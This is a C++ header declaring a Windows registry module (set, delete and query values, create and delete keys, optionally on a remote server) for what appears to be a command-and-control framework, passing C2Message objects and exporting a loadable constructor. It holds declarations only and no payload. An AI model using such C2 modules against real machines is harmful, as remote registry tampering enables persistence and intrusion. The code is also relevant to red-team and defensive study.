#pragma once

#include "ModuleCmd.hpp"

#include <string>
#include <vector>

class Registry : public ModuleCmd
{
public:
    Registry();
    ~Registry();

    std::string getInfo();

    int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
    int process(C2Message& c2Message, C2Message& c2RetMessage);
    int errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg);

    int osCompatibility()
    {
        return OS_WINDOWS;
    }

    enum class Operation : uint32_t
    {
        SetValue = 0,
        DeleteValue,
        QueryValue,
        CreateKey,
        DeleteKey
    };

    struct Parameters
    {
        Operation operation = Operation::SetValue;
        std::string server;
        std::string rootKey;
        std::string subKey;
        std::string valueName;
        std::string valueData;
        std::string valueType;
    };

private:
    std::string packParameters(const Parameters& params) const;
    Parameters unpackParameters(const std::string& data) const;

#ifdef _WIN32
    int execute(const Parameters& params, std::string& result) const;
#endif
};

#ifdef _WIN32
extern "C" __declspec(dllexport) Registry* RegistryConstructor();
#else
extern "C" __attribute__((visibility("default"))) Registry* RegistryConstructor();
#endif
